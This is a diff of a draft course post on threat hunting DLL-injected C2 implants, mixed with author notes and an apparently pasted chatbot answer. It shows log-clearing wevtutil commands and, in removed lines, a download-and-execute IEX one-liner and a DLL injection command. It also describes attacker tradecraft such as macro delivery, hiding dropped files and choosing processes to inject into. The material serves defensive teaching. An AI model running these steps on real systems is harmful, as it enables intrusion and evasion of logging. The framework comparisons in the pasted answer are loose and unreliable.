@@ -3,7 +3,8 @@ title: "Threat Hunting Standard Dll-Injected C2 Implants (Practical Course)"
 date: 2023-07-12T02:01:58+05:30
 description: "In this beginner-friendly practical course we'll learn how to threat hunt standard DLL-injected C2 implants. We'll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings."
 tags: [threat_hunting, C2, dll_injection_attacks]
-author: "faan ross"
+author: "faan | ross"
+draft: true
 ---
 
 *** 
@@ -609,13 +610,6 @@ wevtutil cl "Microsoft-Windows-Sysmon/Operational”
 wevtutil cl "Microsoft-Windows-PowerShell/Operational"
 ```
 
-
-
-
-NO WE ALSO WANT TO CLEAR BOTH POWERSHELL AND SYSMON LOGS
-- after attack immediatelly export sysmon log, then powershell log, then dump memory, then stop pcap, then we do live reading, then do we stop malware.
-
-
 {{< figure src="/img/image036.png" title="" class="custom-figure" >}}
 
 Great now that everything is setup let's generate our stager and transfer it over to the victim. 
@@ -747,7 +741,7 @@ That's it for our attack!
 
 # Artifact Collection
 
-One final thing before we move one: lets concretize all our artifacts.
+One final thing before we move one: lets concretize all our forensic artifacts.
 
 First we'll export our Sysmon log, run the following command in an administrative PowerShell terminal:
 ```
@@ -773,7 +767,7 @@ And finally we'll dump the memory for our post-mortem analysis:
 winpmem.exe memdump.raw
 ```
 
-Awesome. We're ready to move on to our analysis, however I wanna take a kinda "detour" chapter next to grant us a bit of perspective. If it sounds a bit befuddling now, please venture forth soon it will make sense. 
+Awesome. We're ready to move on to our analysis, however I wanna take a kinda "detour" chapter next to grant us a bit of perspective. If it sounds a bit befuddling now, please venture forth - soon it will make sense. 
 
 {{< figure src="/img/confused_dude.gif" title="" class="custom-figure" >}}
 
@@ -802,110 +796,47 @@ Here's what we just did in our attack:
 3. We opened a meterpreter handler on our system.
 4. We then downloaded a powershell script from a web server, and injected it into the victim's memory.
 5. We opened a legitimate program (rufus.exe).
-6. We then 
+6. We then ran the script we downloaded in #4, causing the malicious dll from #1/2 to be injected into the memory space of #5.
+7. The injected DLL is executed, calling back to the handler we created in #3, thereby establishing our backdoor connection.
+8. We exfiltrated some data using our meterpreter shell.
+9. We used our meterpreter shell to spawn a command prompt shell.
+10. We ran a simple command in the new shell (whoami).
 
+OK. Now let's review what an actual attack might have looked like, how these same steps and outcomes would more accurately be represented:
+1. An attacker does some recon/OSINT, discovering info that allows them to craft a very personalized email to a company's head of sales as part of a spearphishing campaign.
+2. The attacker included in this email a word document labelled "urgent invoice", and by using some masterful social engineering techniques they convince the head of sales to immediately open the document to pay it.
+3. With macros enabled, once the head of sales opens the invoice it runs an embedded VBA macro, which contains the adversary's malicious code. 
+4. This code can do many, and even all, of the things we did manually:
+    - It can download the malicious DLL.
+    - It can inject the script responsible for performing the attack into memory.
+    - It can also run the actual script.
+5. Note however that the script does not neccessarily do everything as we described above. It might only go and download instructions, which then allow it to perform subsequent steps. There exists here, as in so many areas of cybersecurity, strategic trade-offs. If the initial VBA macro contains all the instructions that's great since it now has less work to do downloading further instructions. Thus risk is minimized from an activity POV (less steps), however it also means the file will be relatively larger, which can increase the risk of being detected (more noticeable). All to say: both approaches are feasible and have been observed in real attacks, it really depends on the overall risk-mitigation strategy selected by the adversary. 
+6. In our simulation we chose a program (rufus.exe) and even opened it ourselves. In an actual attack this highly improbable since it represents unnecessary risk. Rather, the attacker would select a process that is already running to inject into, which could even lead to elevated privileges. Other considerations would also be selecting processes that are less likely to be terminated or restarted. Common targets might include svchost.exe, explorer.exe, or other system processes.
 
+So that's basically it - I hope this helps you understand how our attack lead to the same outcomes, but just followed another path to get there in the interest of efficiency.
 
+There is one final thing I want to address, another thing that, if you're paying attention you might be wondering why exactly did we do this? If you take a moment to think about it, the initial VBA macro might as well simply just called back to the handler to establish a connection directly. This would have bypassed numerous steps (download + save dll, download + inject script, invoke script), each which represent a potential point of failure or detection. So why go through all this extra effort to get to the same result - a backdoor connection?
 
+{{< figure src="/img/satan.gif" title="" class="custom-figure" >}}
 
+The reason to go through these steps rather than just having the initial script call back to the handler is all about stealth. Yes our process might involve increased risk, but the end result is a connection mediated by an injected DLL and not an executable, which in general will be harder to detect. So again, this game is all about trade-offs: this process accepts a relatively higher degree of risk during the process of establishing itself on the victim's system, however once established it operates with a relatively lower degree of risk. 
 
+Ok friends, thanks for entertaining this little side quest. I do so consciously with the full intent of ensuring you understand the why as much as the how. For now however let's move onto the first phase of our actual threat hunt - live analysis using native windows tools.
 
+***
 
+# LIVE ANALYSIS: NATIVE WINDOWS TOOLS
+# Introduction
+So our first analysis will be a quick review using standard (native) Windows tools. These tools are a quick and dirty means to get a finger on the pulse, meaning they'll give us a broad overview of some important indicators while at the same time being limited in the depth of information.
 
- simulation of the Initial Compromise, well there are courses-a-plenty on it 
- 
- 
- (I provide some links below), so please explore your intellecutal curiosites to your heart's complete content. 
+So if we have at our disposal better tools, ie tools that can provide more information, why bother? I'm of the belief (inspired by one the greats, [John Strand](https://twitter.com/strandjs)), that even if there are better tools availalbe you should *also* be able to do so with the native Windows tools. 
 
-But for now, we're 
+Tools may change, they come and go, or, you might land in a situation where they are, for whatever reason, unavailable. Knowing how to get a basic read with windows tools in any situation covers your bases. Think of it as learning how to survive in the outdoors - yes you can always make a fire with a lighter, but there's a good reason to also learn how to make it, however cumbersome, with what's always available - it might just save your butt. 
 
+{{< figure src="/img/survivorman2.gif" title="" class="custom-figure" >}}
 
-
-
-
-I want to share with you exactly how i performed the dll-injection attack from my kali vm on my windows vm. however, a lot of this is obviously not realistic since I (as the attacker in this scenario) am simply running commands on the victim's system, however at this point theoretically I should not have access to the system, the whole point for performing the attack after all is to get access to it. 
-
-So please do me a favour, describe exactly how what i did would happen in a realistic hypothetical situation? even better, i am going to write my own guess, and then  comment on that and say where i was wrong, right etc.
-
-OK so this is how the actual attack happened
-- i generated a malicious dll on my kali machine using msfvenom and opened a rev tcp handler for a meterpreter shell
-- i created a http server in kali
-- then on the victim's system i downloaded the malicious dll
-- i then ran the following command, which will grab a script from a http server and inject it into memory
-
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
-
-- after this i then opened a program, rufus.exe
-- i ran ps to get the pid of rufus
-- i then ran this command which injected the dll into the rufus memory space, this then called back to my handler, giving me a shell. 
-
-Invoke-DllInjection -ProcessID 3468 -Dll C:\Users\User\Desktop\evil.dll
-
-
-OK, so again a lot of that was "cheating", so I am assuming this is how it could potentially happen realistically?
-
-- an attacker might embed a malicious vbscript macro in a word doc, attach it as an "urgent invoice" in a spearfishing email targeted at head of sales
-- let's say they enable macros, the script executes
-- this script then does what?
-- it goes and downloads the malicious dll from a web server the attacker owns
-- where would it typically be saved? what are "best practices" from the attacker's pov in terms of naming and location to minimize chances of getting caught, 
-- is this same script then responsile for running the IEX command to inject the other script into memory?
-- and is this same initial script also responsible for running the final invoke command?
-- Or would the first script download yet another script which will perform the previous two actions? 
-- and then in the simulation i opened a specific app to inject into (rufus), but i am assuming this is unnecessary risk and thus an actual attacker would likely rather prefer to look at existing processes and inject into one of them? how does one learn about them and their PIDs, and how would it typically decide which is best? or are they pre-programmed to always inject into the same app which the attacker knows is 99% open on victim's machine? and if so, which processes are typical targets? 
-
-finally i have to ask why? since the initial vbscript could just as well called back to the handler, bypassing multiple steps (download dll, download script, invoke script) all which could have failed, why do we go through all that effort to get the same result? is it because that would ultimetly represent a stealthier process and thus less chance of getting caught? 
-
-i know there are a lot of questions etc here please be thorough, go through evertything point by point and comment + answer as much as you can!
-
-========================================
-
-ALWAYS about trade-offs
-intiial script does veverything
-- less risk cause file is smaller
-- more risk because more actions being performed
-
-+ vice-versa
-
-
-This is a great scenario to walk through! It allows us to get a real sense of how an attack might unfold, step by step. 
-
-**1. Your attack setup:**
-Your attack setup is quite realistic in its basic structure. You've covered the generation of a malicious DLL, setting up a reverse shell listener, creating a web server to host the malicious file, downloading it to the victim's machine, and injecting it into a running process. 
-
-**2. How it might occur in the real world:**
-In the real world, an attacker might indeed use a spear-phishing email with a malicious Word document as you suggested. 
-
-When macros are enabled, a script could indeed execute that downloads the malicious DLL from the attacker's server. 
-
-Where the file is saved on the target system would depend on the attacker's preferences and the permissions of the context in which the script runs. Often, attackers will try to save the file in a location that seems innocuous and is less likely to be scanned by antivirus, such as the user's profile directory, temp directory, or a directory related to a legitimate software program. 
-
-**3. On the DLL and its execution:**
-The initial script could certainly be responsible for running the IEX command that loads the DLL injection script into memory and then calls the DLL injection function with the appropriate parameters. Alternatively, the initial script could download another script to perform these tasks, as you suggested. Both approaches are feasible and have been observed in real attacks.
-
-**4. On process injection:**
-You're correct that an attacker would typically look for a running process into which they can inject the malicious code. Often, they'll look for processes that are likely to be running on the machine and that are less likely to be terminated or restarted. Common targets might include svchost.exe, explorer.exe, or other system processes.
-
-**5. Why go through these steps?**
-The reason to go through these steps rather than just having the initial script call back to the handler is indeed often about stealth. Each of these steps might be detected by a different defensive tool, so by breaking the attack up into these steps, an attacker increases the chances that at least some part of the attack will go undetected. For example, a network intrusion detection system might not detect the initial spear-phishing email, but it might detect the download of the malicious DLL. Similarly, a host-based antivirus might not detect the download of the DLL but could potentially detect the process injection. By using these different techniques, an attacker hopes to evade at least some defenses.
-
-This kind of attack is complex and requires significant sophistication on the part of the attacker. However, it also has a high probability of success if not properly defended against. Proper defense requires a multi-layered approach, including user education, network and host-based intrusion detection, antivirus, and more.
-
-Please note that discussing these details is purely for educational purposes, and attempting to perform such attacks without proper authorizations and permissions is illegal and unethical.
-
-1. transfer DLL
-2. inject PS script into memroy
-3. open app (but likely this will aready be open meaning an attacker will likely simply co-opt something
-4. run command to inject dll from 1 into app in 3
-5. run a remote command. 
-6. exfiltrate data
-7. drop a shell
-8. run a command in shell
-
-
-
-
-
+# Performing the Analysis
+There are a number of thi
 
 
 
@@ -958,6 +889,69 @@ Note: have to review Eric Conrad and Chad Tilbury to beef out the first few
 ***
 
 # PART 3: Live Memory Analysis
+
+# THEORY
+# Theory
+# The 3 Phases to a Threat Hunt
+As a Threat Hunter we need to distinguish between three "modes". YES, thrat hunters by definition act as if a compromise has occurred - that is the underlying assumption/tenent from which the very occupation originates. 
+
+PHASE 1 - OPEN-MINDED EXPLORATION
+- But in reality, there is still a time we look at a system anew, look at our preferred places in our preferred manners if we can get some, any, "scent". 
+- We operate with a "beginner's mind here", and do our best to stay objective, free of bias, and look at everything with an open mind.
+
+PHASE 2 - BUILDING A CASE
+- Then there is something that does not smell right, we then catch a whiff of it. Perhaps some strange Parent-Child Process relationhsip shown by Process Hacker or an unusual beaconing persistent connection shown by RITA. 
+- Our interest is defintely piqued, ears perked, but we are not sounding the alarm bells yet. We know that though unlikely, there could still be a legitimate explanation for it. And the last thing we want is to unnecesarrily alert DFIR just to have them immediately contradict your findings. 
+- So in Phase 2 our attention is more narrow, are not looking into the general environment looking for "something in general", no we are looking for something specific.
+- We are building a case, looking for certain pieces of evidence to serve a narrative we are constructing. Each piece of data we uncover layers on top of one another, decreasing the probability of there being a false positive.
+- We continue this up until we our narrative is absed on strong enough supportive evidence as to basically render the probablity of a false positive nil.
+
+PHASE 3 - SUPPORT + COMMUNICATION 
+- Phase 3 can be said to start the moment DFIR is notified.
+- It can also, equally valid, be said to start the moment the Security Event has been reclassified as a Security Incident.
+- Phase 3 can manifest in many ways:
+- We might get strict and highly specific instructions on future actions from DFIR which we likely need to stay true to
+- We might also perform a final few low-risk actions to tie our case together,
+- Additionally we might just work on the actual presentation of the case to the DFIR team, reworking it in such a manner as ensure the highest degree of efficienct and accuracy.
+- Finally, again depending on the exact, the threat hunter might be recruited by DFIR to play a supporting role. 
+
+
+THIS WAS MY IDEA, here is how others have already articulated it:
+Your provided framework is very comprehensive and shows the progression of threat hunting activity from an initial state of unbiased exploration to targeted investigation, to case presentation and potential incident response involvement.
+
+The steps outlined are indeed similar to some cybersecurity frameworks, particularly to threat intelligence and digital forensics incident response (DFIR) practices. Here's a relevant analogy:
+
+1. **Cyber Threat Intelligence Lifecycle**: The Cyber Threat Intelligence (CTI) Lifecycle developed by the SANS Institute is a structured process that ensures the production of actionable intelligence. Its phases mirror your framework: 
+
+   a. **Phase 1: Direction** - Similar to your Phase 1, this is the stage where you plan and direct your threat hunting activities. You decide what you are looking for, in this case, threats, and how you will find them.
+
+   b. **Phase 2: Collection and Processing** - Analogous to your Phase 2, in this phase, you're gathering raw data and information, analyzing it for indicators of compromise (IoCs), and transforming it into intelligence. It’s the step where you might identify a suspicious process or network activity, and start to form a hypothesis.
+
+   c. **Phase 3: Analysis and Production** - In your Phase 3, you've already identified suspicious behavior and are gathering and evaluating additional evidence to validate your findings. This is comparable to the analysis phase in the CTI Lifecycle, where analysts make sense of the collected data and create intelligence products.
+
+   d. **Phase 4: Dissemination and Feedback** - This phase includes your presentation of the case to the DFIR team and potential involvement in the incident response, aligning with the "dissemination and feedback" step in the CTI Lifecycle. It involves sharing the intelligence with stakeholders and getting feedback.
+
+2. **The Diamond Model for Intrusion Analysis**: This is another model that aligns with your framework. Developed by Sergio Caltagirone, Andrew Pendergast and Christopher Betz, the Diamond Model centers on four core features of any intrusion event: adversary, infrastructure, capability, and victim.
+
+   a. **Phase 1: Initial Survey** - Similar to your Phase 1, this involves getting to know the system and looking for any anomalies without any preconceived notion.
+
+   b. **Phase 2: Suspicion and Investigation** - Corresponding to your Phase 2, where the analyst identifies suspicious activity and begins to narrow down their focus, looking for specific evidence to support their hypothesis.
+
+   c. **Phase 3: Mitigation and Response** - This reflects your Phase 3, where the suspected intrusion is escalated to the incident response team, and the threat hunter may be involved in remediation efforts.
+
+While both models described above do not perfectly align with your given framework, they provide a comparable structure of cybersecurity activities. They all encapsulate the progression of cyber threat hunting and response, starting from the initial discovery phase to the investigation and response phase.
+
+For LOG ANALYSIS intro:
+- mention this one usualyl more realm of SOC/SIEM and not Forensics, which usually more focus of threat hutning.
+- Likely one of the thoughts underpinning this attitude is that logs are grunt-work, mountains of nothing that needs to be sifted through, mountains so huge its completly beyond the scope of humams, and so SIEMs not only CAN do it, but are better than humans in it. 
+
+- but that is true for the general appraco to logs. But what we are speaking of here is a much specific way of looking at logs - limitiing the type of logs we look at. Additioarnlly, logs depending on the PHASE. See below - logs might not be a great place to start in Phase 1, but for example can be perfect for Phase 2. Sicne you already more or less know what you are looking for, makes the volume manageable, esp considering we're likely only interested in Sysmon, Powershell, and a highly select WEL IDs. 
+
+
+ULTIMATELY, Phase 1 should focus on where they cannot hide - meaning memory and packets. Every where else, disk, logs, etc they can hide. but they can never hide from memory/packets = memory when they are at rest/use, packets when they are in transit. 
+
+
+Ok so now as we go ahead, remember we have no idea of the attack, we don't know a DLL injected attack has happened, since that was "evil ash" doing it. Meaning we are in Phase 1, and then thios I might not mention but for own sanity - at end of live analysis II (PE Hacker), we can then switch over to Phase II.
 
 WHY MEMORY?
 and finally we'll also look at memory foresnics: for some reason a lot fo thought is still stuck in malware paradignms for a decade ago looking at discs. but almost all modern malware won't even exists on the disk, they live in memory and their proably followign a "living off the land" approach in that they use local processes and services to handle all the mischief. so we'll create a dump with something like dumpit! and then we'll use volatitliy
@@ -1183,6 +1177,9 @@ This section was admitrtedly not all-too revelatory. But that's really because w
 I think this a good introduction to Volatility3, though we could obviously go much deeper I'll leave that for our next course. 
 
 SO for now let's jump straight into log analysis with an emphasis on UEBA.
+
+reference
+https://www.youtube.com/watch?v=cYphLiySAC4
 
 ***
 
